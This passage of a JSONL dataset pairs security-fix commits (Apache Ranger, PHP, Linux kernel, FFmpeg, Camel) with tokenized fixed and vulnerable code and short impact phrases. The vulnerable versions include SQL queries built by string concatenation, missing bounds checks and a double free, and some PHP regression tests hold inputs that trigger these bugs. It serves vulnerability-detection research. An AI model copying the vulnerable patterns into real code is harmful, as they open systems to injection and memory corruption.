"}", "}", "vPortalUser", ".", "setUserRoleList", "(", "daoManager", ".", "getXXPortalUserRole", "(", ").", "findXPortalUserRolebyXPortalUserId", "(", "vPortalUser", ".", "getId", "(", "))", ");", "<", "named", "-", "query", "name", "=", "\"", "XXDataHist", ".", "findLatestByObjectClassTypeAndObjectIdAndEventTime", "\"", ">", "<", "query", ">", "select", "obj", "from", "XXDataHist", "obj", "where", "obj", ".", "objectId", "=", ":", "objectId", "and", "obj", ".", "objectClassType", "=", ":", "classType", "and", "obj", ".", "createTime", "&", "lt", ";", "=", ":", "createTime", "ORDER", "BY", "obj", ".", "id", "DESC", "<", "/", "query", ">", "<", "/", "named", "-", "query", ">", "<", "named", "-", "query", "name", "=", "\"", "XXPortalUserRole", ".", "findXPortalUserRolebyXPortalUserId", "\"", ">", "<", "query", ">", "select", "obj", ".", "userRole", "from", "XXPortalUserRole", "obj", "where", "obj", ".", "userId", "=", ":", "userId", "<", "/", "query", ">", "<", "/", "named", "-", "query", "></s>import", "javax", ".", "persistence", ".", "Query", ";", "import", "org", ".", "apache", ".", "ranger", ".", "biz", ".", "RangerBizUtil", ";", "import", "org", ".", "apache", ".", "ranger", ".", "common", ".", "AppConstants", ";", "int", "dbFlavor", "=", "RangerBizUtil", ".", "getDBFlavor", "(", ");", "String", "queryStr", "=", "\"", "\";", "if", "(", "dbFlavor", "=", "=", "AppConstants", ".", "DB_FLAVOR_ORACLE", ")", "{", "queryStr", "=", "\"", "select", "obj", ".", "*", "from", "x_data_hist", "obj", "where", "obj", ".", "obj_class_type", "=", "\"", "+", "classType", "+", "\"", "and", "obj", ".", "obj_id", "=", "\"", "+", "objId", "+", "\"", "and", "to_date", "(", "obj", ".", "create_time", ",", "'", "YYYY", "-", "MM", "-", "DD", "\\", "\"", "T", "\\", "\"", "HH24", ":", "MI", ":", "SS", "\\", "\"", "Z", "\\", "\"'", ")", "<", "=", "to_date", "(", "'\"", "+", "eventTime", "+", "\"", "',", "'", "YYYY", "-", "MM", "-", "DD", "\\", "\"", "T", "\\", "\"", "HH24", ":", "MI", ":", "SS", "\\", "\"", "Z", "\\", "\"'", ")", "ORDER", "BY", "obj", ".", "id", "DESC", "\"", ";", "}", "else", "{", "queryStr", "=", "\"", "select", "obj", ".", "*", "from", "x_data_hist", "obj", "where", "obj", ".", "obj_class_type", "=", "\"", "+", "classType", "+", "\"", "and", "obj", ".", "obj_id", "=", "\"", "+", "objId", "+", "\"", "and", "obj", ".", "create_time", "<", "=", "'", "\"", "+", "eventTime", "+", "\"", "'", "ORDER", "BY", "obj", ".", "id", "DESC", "\"", ";", "}", "Query", "jpaQuery", "=", "getEntityManager", "(", ").", "createNativeQuery", "(", "queryStr", ",", "tClass", ")", ".", "setMaxResults", "(", "1", ")", ";", "return", "(", "XXDataHist", ")", "jpaQuery", ".", "getSingleResult", "(", ");", "@", "SuppressWarnings", "(", "\"", "unchecked", "\"", ")", "public", "List", "<", "String", ">", "findXPortalUserRolebyXPortalUserId", "(", "Long", "userId", ")", "{", "try", "{", "return", "getEntityManager", "(", ")", ".", "createNativeQuery", "(", "\"", "select", "user_role", "from", "x_portal_user_role", "where", "user_id", "=", "\"+", "userId", "+", "\"\"", ")", ".", "getResultList", "(", ");", "}", "catch", "(", "Exception", "e", ")", "{", "return", "null", ";", "}", "}", "vPortalUser", ".", "setUserRoleList", "(", "daoManager", ".", "getXXPortalUser", "(", ").", "findXPortalUserRolebyXPortalUserId", "(", "vPortalUser", ".", "getId", "(", "))", ");"], "docstring_tokens": ["modify", "or", "delete", "information", "in", "the", "back-end", "database"]}
{"contents": ["Fix", "bug", "#72093:", "bcpowmod", "accepts", "negative", "scale", "and", "corrupts", "_one_", "definition", "We", "can", "not", "modify", "result", "since", "it", "can", "be", "copy", "of", "_zero_", "or", "_one_,", "etc.", "and", "\"copy\"", "in", "bcmath", "is", "just", "bumping", "the", "refcount."], "code_tokens": ["/", "*", "{", "{{", "split_bc_num", "Convert", "to", "bc_num", "detecting", "scale", "*", "/", "static", "bc_num", "split_bc_num", "(", "bc_num", "num", ")", "{", "bc_num", "newnum", ";", "if", "(", "num", "-", ">", "n_refs", ">", "=", "1", ")", "{", "return", "num", ";", "}", "newnum", "=", "_bc_new_num_ex", "(", "0", ",", "0", ",", "0", ")", ";", "*", "newnum", "=", "*", "num", ";", "newnum", "-", ">", "n_refs", "=", "1", ";", "num", "-", ">", "n_refs", "-", "-;", "return", "newnum", ";", "}", "/", "*", "}", "}}", "*", "/", "result", "=", "split_bc_num", "(", "result", ")", ";", "result", "=", "split_bc_num", "(", "result", ")", ";", "result", "=", "split_bc_num", "(", "result", ")", ";", "result", "=", "split_bc_num", "(", "result", ")", ";", "if", "(", "result", "-", ">", "n_scale", ">", "scale_int", ")", "{", "result", "=", "split_bc_num", "(", "result", ")", ";", "result", "-", ">", "n_scale", "=", "scale_int", ";", "result", "=", "split_bc_num", "(", "result", ")", ";", "result", "=", "split_bc_num", "(", "result", ")", ";", "-", "-", "TEST", "-", "-", "Bug", "72093", ":", "bcpowmod", "accepts", "negative", "scale", "and", "corrupts", "_one_", "definition", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "\"", "bcmath", "\"", "))", "print", "\"", "skip", "\"", ";", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "var_dump", "(", "bcpowmod", "(", "1", ",", "\"", "A", "\"", ",", "128", ",", "-", "200", ")", ");", "var_dump", "(", "bcpowmod", "(", "1", ",", "1", ".", "2", ",", "1", ",", "1", ")", ");", "?", ">", "-", "-", "EXPECTF", "-", "-", "string", "(", "1", ")", "\"", "1", "\"", "bc", "math", "warning", ":", "non", "-", "zero", "scale", "in", "exponent", "string", "(", "3", ")", "\"", "0", ".", "0", "\"", "@", "@", "-", "2", ",", "7", "+", "2", ",", "7", "@", "@", "#", "define", "PHP_RELEASE_VERSION", "27", "#", "define", "PHP_VERSION", "\"", "5", ".", "5", ".", "27", "-", "dev", "\"", "#", "define", "PHP_VERSION_ID", "50527</s>if", "(", "result", "-", ">", "n_scale", ">", "scale", ")", "{", "result", "-", ">", "n_scale", "=", "scale", ";", "#", "define", "PHP_RELEASE_VERSION", "35", "#", "define", "PHP_VERSION", "\"", "5", ".", "5", ".", "35", "-", "dev", "\"", "#", "define", "PHP_VERSION_ID", "50535"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "or", "possibly", "have", "unspecified", "other", "impact"]}
{"contents": ["Fix", "bug", "#68027", "-", "fix", "date", "parsing", "in", "XMLRPC", "lib"], "code_tokens": ["XMLRPC_IS_NUMBER", "(", "text", "[", "i", "+", "4", "]", ")", "if", "(", "tm", ".", "tm_mon", "<", "0", "|", "|", "tm", ".", "tm_mon", ">", "11", ")", "{", "return", "-", "1", ";", "}", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "+", "6", "]", ")", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "+", "9", "]", ")", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "+", "12", "]", ")", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "+", "15", "]", ")", "-", "-", "TEST", "-", "-", "Bug", "#", "68027", "(", "buffer", "overflow", "in", "mkgmtime", "(", ")", "function", ")", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "\"", "xmlrpc", "\"", "))", "print", "\"", "skip", "\"", ";", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "d", "=", "'", "6", "-", "01", "-", "01", "20", ":", "00", ":", "00", "'", ";", "xmlrpc_set_type", "(", "$", "d", ",", "'", "datetime", "'", ");", "var_dump", "(", "$", "d", ")", ";", "$", "datetime", "=", "\"", "2001", "-", "0", "-", "08T21", ":", "46", ":", "40", "-", "0400", "\"", ";", "$", "obj", "=", "xmlrpc_decode", "(", "\"<", "?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"?", "><", "methodResponse", ">", "<", "params", ">", "<", "param", ">", "<", "value", ">", "<", "dateTime", ".", "iso8601", ">", "$", "datetime", "<", "/", "dateTime", ".", "iso8601", ">", "</", "value", ">", "</", "param", ">", "</", "params", ">", "</", "methodResponse", ">", "\")", ";", "print_r", "(", "$", "obj", ")", ";", "$", "datetime", "=", "\"", "34770", "-", "0", "-", "08T21", ":", "46", ":", "40", "-", "0400", "\"", ";", "$", "obj", "=", "xmlrpc_decode", "(", "\"<", "?", "xml", "version", "=", "\\\"", "1", ".", "0", "\\", "\"?", "><", "methodResponse", ">", "<", "params", ">", "<", "param", ">", "<", "value", ">", "<", "dateTime", ".", "iso8601", ">", "$", "datetime", "<", "/", "dateTime", ".", "iso8601", ">", "</", "value", ">", "</", "param", ">", "</", "params", ">", "</", "methodResponse", ">", "\")", ";", "print_r", "(", "$", "obj", ")", ";", "echo", "\"", "Done", "\\", "n", "\"", ";", "?", ">", "-", "-", "EXPECTF", "-", "-", "object", "(", "stdClass", ")", "#", "1", "(", "3", ")", "{", "[", "\"", "scalar", "\"", "]=", ">", "string", "(", "16", ")", "\"", "6", "-", "01", "-", "01", "20", ":", "00", ":", "00", "\"", "[", "\"", "xmlrpc_type", "\"", "]=", ">", "string", "(", "8", ")", "\"", "datetime", "\"", "[", "\"", "timestamp", "\"", "]=", ">", "int", "(", "%", "d", ")", "}", "stdClass", "Object", "(", "[", "scalar", "]", "=", ">", "2001", "-", "0", "-", "08T21", ":", "46", ":", "40", "-", "0400", "[", "xmlrpc_type", "]", "=", ">", "datetime", "[", "timestamp", "]", "=", ">", "%", "s", ")", "stdClass", "Object", "(", "[", "scalar", "]", "=", ">", "34770", "-", "0", "-", "08T21", ":", "46", ":", "40", "-", "0400", "[", "xmlrpc_type", "]", "=", ">", "datetime", "[", "timestamp", "]", "=", ">", "%", "d", ")", "Done</s>XMLRPC_IS_NUMBER", "(", "text", "[", "i", "]", ")", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "]", ")", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "]", ")", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "]", ")", "XMLRPC_IS_NUMBER", "(", "text", "[", "i", "]", ")"], "docstring_tokens": ["overflow", "a", "buffer", "and", "execute", "arbitrary", "code", "on", "the", "system", "or", "cause", "the", "application", "to", "crash"]}
{"contents": ["ext4:", "Add", "sanity", "checks", "for", "the", "superblock", "before", "mounting", "the", "filesystem", "This", "avoids", "insane", "superblock", "configurations", "that", "could", "lead", "to", "kernel", "oops", "due", "to", "null", "pointer", "derefences.", "http://bugzilla.kernel.org/show_bug.cgi?id=12371", "Thanks", "to", "David", "Maciejak", "at", "Fortinet's", "FortiGuard", "Global", "Security", "Research", "Team", "who", "discovered", "this", "bug", "independently", "(but", "at", "approximately", "the", "same", "time)", "as", "Thiemo", "Nagel,", "who", "submitted", "the", "patch.", "Signed-off-by:", "Thiemo", "Nagel", "<thiemo.nagel@ph.tum.de>", "Signed-off-by:", "\"Theodore", "Ts'o\"", "<tytso@mit.edu>", "Cc:", "stable@kernel.org"], "code_tokens": ["unsigned", "int", "db_count", ";", "unsigned", "int", "i", ";", "/", "*", "*", "It", "makes", "no", "sense", "for", "the", "first", "data", "block", "to", "be", "beyond", "the", "end", "*", "of", "the", "filesystem", ".", "*", "/", "if", "(", "le32_to_cpu", "(", "es", "-", ">", "s_first_data_block", ")", ">", "=", "ext4_blocks_count", "(", "es", ")", ")", "{", "printk", "(", "KERN_WARNING", "\"", "EXT4", "-", "fs", ":", "bad", "geometry", ":", "first", "data", "\"", "\"", "block", "%", "u", "is", "beyond", "end", "of", "filesystem", "(", "%", "llu", ")", "\\", "n", "\"", ",", "le32_to_cpu", "(", "es", "-", ">", "s_first_data_block", ")", ",", "ext4_blocks_count", "(", "es", ")", ");", "if", "(", "blocks_count", ">", "(", "(", "uint64_t", ")", "1", "<", "<", "32", ")", "-", "EXT4_DESC_PER_BLOCK", "(", "sb", ")", ")", "{", "printk", "(", "KERN_WARNING", "\"", "EXT4", "-", "fs", ":", "groups", "count", "too", "large", ":", "%", "u", "\"", "\"", "(", "block", "count", "%", "llu", ",", "first", "data", "block", "%", "u", ",", "\"", "\"", "blocks", "per", "group", "%", "lu", ")", "\\", "n", "\"", ",", "sbi", "-", ">", "s_groups_count", ",", "ext4_blocks_count", "(", "es", ")", ",", "le32_to_cpu", "(", "es", "-", ">", "s_first_data_block", ")", ",", "EXT4_BLOCKS_PER_GROUP", "(", "sb", ")", ");", "goto", "failed_mount", ";", "}</s>int", "db_count", ";", "int", "i", ";", "/", "*", "ensure", "blocks_count", "calculation", "below", "doesn", "'", "t", "sign", "-", "extend", "*", "/", "if", "(", "ext4_blocks_count", "(", "es", ")", "+", "EXT4_BLOCKS_PER_GROUP", "(", "sb", ")", "<", "le32_to_cpu", "(", "es", "-", ">", "s_first_data_block", ")", "+", "1", ")", "{", "printk", "(", "KERN_WARNING", "\"", "EXT4", "-", "fs", ":", "bad", "geometry", ":", "block", "count", "%", "llu", ",", "\"", "\"", "first", "data", "block", "%", "u", ",", "blocks", "per", "group", "%", "lu", "\\", "n", "\"", ",", "ext4_blocks_count", "(", "es", ")", ",", "le32_to_cpu", "(", "es", "-", ">", "s_first_data_block", ")", ",", "EXT4_BLOCKS_PER_GROUP", "(", "sb", ")", ");"], "docstring_tokens": ["crash", "the", "vulnerable", "system"]}
{"contents": ["CAMEL-10894:", "Improve", "test", "fix"], "code_tokens": ["if", "(", "camelContext", "=", "=", "null", "|", "|", "!", "Boolean", ".", "parseBoolean", "(", "camelContext", ".", "getProperty", "(", "ACCESS_EXTERNAL_DTD", ")", "))", "{</s>if", "(", "camelContext", "!", "=", "null", "&", "&", "!", "Boolean", ".", "parseBoolean", "(", "camelContext", ".", "getProperty", "(", "ACCESS_EXTERNAL_DTD", ")", "))", "{"], "docstring_tokens": ["read", "arbitrary", "files"]}
{"contents": ["mm:", "add", "!pte_present()", "check", "on", "existing", "hugetlb_entry", "callbacks", "The", "age", "table", "walker", "doesn't", "check", "non-present", "hugetlb", "entry", "in", "common", "path,", "so", "hugetlb_entry()", "callbacks", "must", "check", "it.", "The", "reason", "for", "this", "behavior", "is", "that", "some", "callers", "want", "to", "handle", "it", "in", "its", "own", "way.", "[", "I", "think", "that", "reason", "is", "bogus,", "btw", "-", "it", "should", "just", "do", "what", "the", "regular", "code", "does,", "which", "is", "to", "call", "the", "\"pte_hole()\"", "function", "for", "such", "hugetlb", "entries", "-", "Linus]", "However,", "some", "callers", "don't", "check", "it", "now,", "which", "causes", "unpredictable", "result,", "for", "example", "when", "we", "have", "a", "race", "between", "migrating", "hugepage", "and", "reading", "/proc/pid/numa_maps.", "This", "patch", "fixes", "it", "by", "adding", "!pte_present", "checks", "on", "buggy", "callbacks.", "This", "bug", "exists", "for", "years", "and", "got", "visible", "by", "introducing", "hugepage", "migration.", "ChangeLog", "v2:", "-", "fix", "if", "condition", "(check", "!pte_present()", "instead", "of", "pte_present())", "Reported-by:", "Sasha", "Levin", "<sasha.levin@oracle.com>", "Signed-off-by:", "Naoya", "Horiguchi", "<n-horiguchi@ah.jp.nec.com>", "Cc:", "Rik", "van", "Riel", "<riel@redhat.com>", "Cc:", "<stable@vger.kernel.org>", "[3.12+]", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "[", "Backported", "to", "3.15.", "Signed-off-by:", "Josh", "Boyer", "<jwboyer@fedoraproject.org>", "]", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["if", "(", "!", "pte_present", "(", "*", "pte", ")", ")", "pte_t", "entry", ";", "entry", "=", "huge_ptep_get", "(", "(", "pte_t", "*", ")", "pmd", ")", ";", "if", "(", "!", "pte_present", "(", "entry", ")", ")", "goto", "unlock", ";", "page", "=", "pte_page", "(", "entry", ")", ";</s>if", "(", "pte_none", "(", "*", "pte", ")", ")", "page", "=", "pte_page", "(", "huge_ptep_get", "(", "(", "pte_t", "*", ")", "pmd", ")", ");"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(memory", "corruption", "or", "system", "crash", ")"]}
{"contents": ["Fix", "bug", "#72402:", "_php_mb_regex_ereg_replace_exec", "-", "double", "free"], "code_tokens": ["static", "void", "php_mb_regex_free_cache", "(", "php_mb_regex_t", "*", "*", "pre", ")", "static", "void", "_php_mb_regex_globals_dtor", "(", "zend_mb_regex_globals", "*", "pglobals", "TSRMLS_DC", ")", "return", "retval", ";", "+", "+", "len_req", ";", "+", "+", "len_req", ";", "+", "+", "len_req", ";", "+", "+", "len_req", ";", "+", "+", "len_req", ";", "}", "+", "+", "len_req", ";", "+", "+", "len_req", ";", "+", "+", "len_req", ";", "_php_mb_regex_init_options", "(", "const", "char", "*", "parg", ",", "int", "narg", ",", "OnigOptionType", "*", "option", ",", "OnigSyntaxType", "*", "*", "syntax", ",", "int", "*", "eval", ")", "int", "optm", "=", "0", ";", "if", "(", "eval", "!", "=", "NULL", ")", "*", "eval", "=", "1", ";", "if", "(", "option", "!", "=", "NULL", ")", "*", "option", "|", "=", "optm", ";", "pat_buf", "[", "0", "]", "=", "(", "char", ")", "Z_LVAL_PP", "(", "arg_pattern_zval", ")", ";", "arg_pattern_len", "=", "1", ";", "zval", "*", "retval_ptr", "=", "NULL", ";", "}", "if", "(", "zend_call_function", "(", "&", "arg_replace_fci", ",", "&", "arg_replace_fci_cache", "TSRMLS_CC", ")", "=", "=", "SUCCESS", "&", "&", "arg_replace_fci", ".", "retval_ptr_ptr", "&", "&", "retval_ptr", ")", "{", "smart_str_appendl", "(", "&", "out_buf", ",", "pos", ",", "1", ")", ";", "smart_str_free", "(", "&", "out_buf", ")", ";", "}", "static", "void", "_php_mb_regex_set_options", "(", "OnigOptionType", "options", ",", "OnigSyntaxType", "*", "syntax", ",", "OnigOptionType", "*", "prev_options", ",", "OnigSyntaxType", "*", "*", "prev_syntax", "TSRMLS_DC", ")", "-", "-", "TEST", "-", "-", "Bug", "#", "72402", ":", "_php_mb_regex_ereg_replace_exec", "-", "double", "free", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "extension_loaded", "(", "'", "mbstring", "'", ")", "or", "die", "(", "'", "skip", "mbstring", "not", "available", "'", ");", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "function", "throwit", "(", ")", "{", "throw", "new", "Exception", "(", "'", "it", "'", ");", "}", "$", "var10", "=", "\"", "throwit", "\"", ";", "try", "{", "$", "var14", "=", "mb_ereg_replace_callback", "(", "\"\"", ",", "$", "var10", ",", "\"", "\")", ";", "}", "catch", "(", "Exception", "$", "e", ")", "{", "}", "?", ">", "DONE", "-", "-", "EXPECT", "-", "-", "DONE</s>static", "void", "php_mb_regex_free_cache", "(", "php_mb_regex_t", "*", "*", "pre", ")", "static", "void", "_php_mb_regex_globals_dtor", "(", "zend_mb_regex_globals", "*", "pglobals", "TSRMLS_DC", ")", "return", "retval", ";", "-", "-", "len_left", ";", "+", "+", "len_req", ";", "-", "-", "len_left", ";", "+", "+", "len_req", ";", "-", "-", "len_left", ";", "+", "+", "len_req", ";", "-", "-", "len_left", ";", "+", "+", "len_req", ";", "-", "-", "len_left", ";", "+", "+", "len_req", ";", "}", "-", "-", "len_left", ";", "+", "+", "len_req", ";", "-", "-", "len_left", ";", "+", "+", "len_req", ";", "-", "-", "len_left", ";", "+", "+", "len_req", ";", "_php_mb_regex_init_options", "(", "const", "char", "*", "parg", ",", "int", "narg", ",", "OnigOptionType", "*", "option", ",", "OnigSyntaxType", "*", "*", "syntax", ",", "int", "*", "eval", ")", "int", "optm", "=", "0", ";", "if", "(", "eval", "!", "=", "NULL", ")", "*", "eval", "=", "1", ";", "if", "(", "option", "!", "=", "NULL", ")", "*", "option", "|", "=", "optm", ";", "pat_buf", "[", "0", "]", "=", "(", "char", ")", "Z_LVAL_PP", "(", "arg_pattern_zval", ")", ";", "arg_pattern_len", "=", "1", ";", "zval", "*", "retval_ptr", ";", "}", "if", "(", "zend_call_function", "(", "&", "arg_replace_fci", ",", "&", "arg_replace_fci_cache", "TSRMLS_CC", ")", "=", "=", "SUCCESS", "&", "&", "arg_replace_fci", ".", "retval_ptr_ptr", ")", "{", "efree", "(", "description", ")", ";", "smart_str_appendl", "(", "&", "out_buf", ",", "pos", ",", "1", ")", ";", "smart_str_free", "(", "&", "out_buf", ")", ";", "}", "static", "void", "_php_mb_regex_set_options", "(", "OnigOptionType", "options", ",", "OnigSyntaxType", "*", "syntax", ",", "OnigOptionType", "*", "prev_options", ",", "OnigSyntaxType", "*", "*", "prev_syntax", "TSRMLS_DC", ")"], "docstring_tokens": ["execute", "arbitrary", "code", "or", "cause", "a", "denial", "of", "service", "(application", "crash", ")"]}
{"contents": ["net:", "cdc_ether:", "fix", "divide", "by", "0", "on", "bad", "descriptors", "Setting", "dev->hard_mtu", "to", "0", "will", "cause", "a", "divide", "error", "in", "usbnet_probe.", "Protect", "against", "devices", "with", "bogus", "CDC", "Ethernet", "functional", "descriptors", "by", "ignoring", "a", "zero", "wMaxSegmentSize.", "Signed-off-by:", "Bj\u00f8rn", "Mork", "<bjorn@mork.no>", "Acked-by:", "Oliver", "Neukum", "<oneukum@suse.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["if", "(", "header", ".", "usb_cdc_ether_desc", "&", "&", "info", "-", ">", "ether", "-", ">", "wMaxSegmentSize", ")", "{</s>if", "(", "header", ".", "usb_cdc_ether_desc", ")", "{"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(divide-by-zero", "error", "and", "system", "crash", ")", "or", "possibly", "have", "unspecified", "other", "impact"]}
{"contents": ["avcodec/cdxl:", "Check", "format", "for", "BGR24", "Fixes:", "out", "of", "array", "access", "Fixes:", "1427/clusterfuzz-testcase-minimized-5020737339392000", "Found-by:", "continuous", "fuzzing", "process", "https://github.com/google/oss-fuzz/tree/master/targets/ffmpeg", "Signed-off-by:", "Michael", "Niedermayer", "<michael@niedermayer.cc>"], "code_tokens": ["}", "else", "if", "(", "encoding", "=", "=", "1", "&", "&", "(", "c", "-", ">", "bpp", "=", "=", "6", "|", "|", "c", "-", ">", "bpp", "=", "=", "8", ")", "&", "&", "c", "-", ">", "format", "!", "=", "CHUNKY", ")", "{</s>}", "else", "if", "(", "encoding", "=", "=", "1", "&", "&", "(", "c", "-", ">", "bpp", "=", "=", "6", "|", "|", "c", "-", ">", "bpp", "=", "=", "8", ")", ")", "{"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(heap-based", "buffer", "overflow", "and", "application", "crash", ")", "or", "possibly", "have", "unspecified", "other", "impact"]}
{"contents": ["USB:", "serial:", "visor:", "fix", "crash", "on", "detecting", "device", "without", "write_urbs", "The", "visor", "driver", "crashes", "in", "clie_5_attach()", "when", "a", "specially", "crafted", "USB", "device", "without", "bulk-out", "endpoint", "is", "detected.", "This", "fix", "adds", "a", "check", "that", "the", "device", "has", "proper", "configuration", "expected", "by", "the", "driver.", "Reported-by:", "Ralf", "Spenneberg", "<ralf@spenneberg.net>", "Signed-off-by:", "Vladis", "Dronov", "<vdronov@redhat.com>", "Fixes:", "cfb8da8f69b8", "(\"USB:", "visor:", "fix", "initialisation", "of", "UX50/TH55", "devices\")", "Cc:", "stable", "<stable@vger.kernel.org>", "Signed-off-by:", "Johan", "Hovold", "<johan@kernel.org>"], "code_tokens": ["if", "(", "serial", "-", ">", "num_bulk_out", "<", "2", ")", "{", "dev_err", "(", "&", "serial", "-", ">", "interface", "-", ">", "dev", ",", "\"", "missing", "bulk", "out", "endpoints", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}</s>if", "(", "serial", "-", ">", "num_ports", "<", "2", ")", "return", "-", "1", ";"], "docstring_tokens": ["crash", "of", "the", "system", "."]}
{"contents": ["Invoke", "assertRegistration", "before", "sending", "command", "to", "gateway.", "Only", "done", "if", "gateway", "has", "subscribed", "specifically", "for", "the", "device", "the", "command", "is", "targeted", "at.", "Signed-off-by:", "Carsten", "Lohmann", "<carsten.lohmann@bosch.io>"], "code_tokens": ["}", ").", "compose", "(", "success", "-", ">", "{", "/", "/", "in", "case", "of", "a", "gateway", "having", "subscribed", "for", "a", "specific", "device", ",", "/", "/", "check", "the", "via", "-", "gateways", ",", "ensuring", "that", "the", "gateway", "may", "act", "on", "behalf", "of", "the", "device", "at", "this", "point", "in", "time", "if", "(", "authenticatedDevice", "!", "=", "null", "&", "&", "!", "authenticatedDevice", ".", "getDeviceId", "(", ").", "equals", "(", "sourceAddress", ".", "getResourceId", "(", "))", ")", "{", "return", "getRegistrationAssertion", "(", "authenticatedDevice", ".", "getTenantId", "(", "),", "sourceAddress", ".", "getResourceId", "(", "),", "authenticatedDevice", ",", "commandContext", ".", "getTracingContext", "(", "))", ";", "}", "return", "Future", ".", "succeededFuture", "(", ");", "}", ").", "compose", "(", "success", "-", ">", "{", "/", "/", "in", "case", "of", "a", "gateway", "having", "subscribed", "for", "a", "specific", "device", ",", "/", "/", "check", "the", "via", "-", "gateways", ",", "ensuring", "that", "the", "gateway", "may", "act", "on", "behalf", "of", "the", "device", "at", "this", "point", "in", "time", "if", "(", "subscription", ".", "isGatewaySubscriptionForSpecificDevice", "(", "))", "{", "return", "getRegistrationAssertion", "(", "authenticatedDevice", ".", "getTenantId", "(", "),", "subscription", ".", "getDeviceId", "(", "),", "authenticatedDevice", ",", "commandContext", ".", "getTracingContext", "(", "))", ";", "}", "return", "Future", ".", "succeededFuture", "(", ");</s>/", "/", "determine", "last", "used", "gateway", "device", "id"], "docstring_tokens": ["receive", "command", "&", "control", "messages", "when", "it", "has", "subscribed", "only", "to", "commands", "for", "a", "specific", "device", "."]}
{"contents": ["Fixed", "Bug", "#67411", "fileinfo:", "cdf_check_stream_offset", "insufficient", "boundary", "check", "Upstream:", "https://github.com/file/file/commit/36fadd29849b8087af9f4586f89dbf74ea45be67", "Conflicts:", "ext/fileinfo/libmagic/cdf.c"], "code_tokens": ["size_t", "ss", "=", "sst", "-", ">", "sst_dirlen", "<", "h", "-", ">", "h_min_size_standard_stream", "?", "CDF_SHORT_SEC_SIZE", "(", "h", ")", ":", "CDF_SEC_SIZE", "(", "h", ")", ";", "if", "(", "e", ">", "=", "b", "&", "&", "(", "size_t", ")", "(", "e", "-", "b", ")", "<", "=", "ss", "*", "sst", "-", ">", "sst_len", ")", "ss", "*", "sst", "-", ">", "sst_len", ",", "ss", ",", "sst", "-", ">", "sst_len", ")", ");</s>if", "(", "e", ">", "=", "b", "&", "&", "(", "size_t", ")", "(", "e", "-", "b", ")", "<", "CDF_SEC_SIZE", "(", "h", ")", "*", "sst", "-", ">", "sst_len", ")", "CDF_SEC_SIZE", "(", "h", ")", "*", "sst", "-", ">", "sst_len", ",", "CDF_SEC_SIZE", "(", "h", ")", ",", "sst", "-", ">", "sst_len", ")", ");"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(application", "crash", ")"]}
{"contents": ["Fix", "abort", "when", "writing", "to", "rgf", "format", "The", "rgf", "format", "(LEGO", "MINDSTORMS", "EV3", "images)", "caused", "a", "software", "abort", "because", "exception", "==", "NULL.", "When", "WriteRGFImage", "is", "called", "from", "WriteImage,", "it", "is", "only", "passed", "two", "parameters,", "not", "three.", "So,", "removed", "the", "extra", "parameter", "and", "use", "image->exception", "instead", "as", "in", "other", "coders."], "code_tokens": ["WriteRGFImage", "(", "const", "ImageInfo", "*", ",", "Image", "*", ");", "%", "Image", "*", "image", ")", "static", "MagickBooleanType", "WriteRGFImage", "(", "const", "ImageInfo", "*", "image_info", ",", "Image", "*", "image", ")", "status", "=", "OpenBlob", "(", "image_info", ",", "image", ",", "WriteBinaryBlobMode", ",", "&", "image", "-", ">", "exception", ")", ";", "p", "=", "GetVirtualPixels", "(", "image", ",", "0", ",", "y", ",", "image", "-", ">", "columns", ",", "1", ",", "&", "image", "-", ">", "exception", ")", ";</s>WriteRGFImage", "(", "const", "ImageInfo", "*", ",", "Image", "*", ",", "ExceptionInfo", "*", ");", "%", "Image", "*", "image", ",", "ExceptionInfo", "*", "exception", ")", "static", "MagickBooleanType", "WriteRGFImage", "(", "const", "ImageInfo", "*", "image_info", ",", "Image", "*", "image", ",", "ExceptionInfo", "*", "exception", ")", "assert", "(", "exception", "!", "=", "(", "ExceptionInfo", "*", ")", "NULL", ")", ";", "assert", "(", "exception", "-", ">", "signature", "=", "=", "MagickSignature", ")", ";", "status", "=", "OpenBlob", "(", "image_info", ",", "image", ",", "WriteBinaryBlobMode", ",", "exception", ")", ";", "p", "=", "GetVirtualPixels", "(", "image", ",", "0", ",", "y", ",", "image", "-", ">", "columns", ",", "1", ",", "exception", ")", ";"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(assertion", "failure", ")"]}
{"contents": ["fix", "#72494,", "improve", "input", "color", "check", "and", "prevent", "issues", "when", "old", "gd", "are", "used,", "done", "before", "gd", "call"], "code_tokens": ["if", "(", "color", "<", "0", "|", "|", "(", "!", "gdImageTrueColor", "(", "im", ")", "&", "&", "color", ">", "=", "gdImageColorsTotal", "(", "im", ")", "))", "{</s>if", "(", "color", "<", "0", ")", "{"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(application", "crash", ")"]}
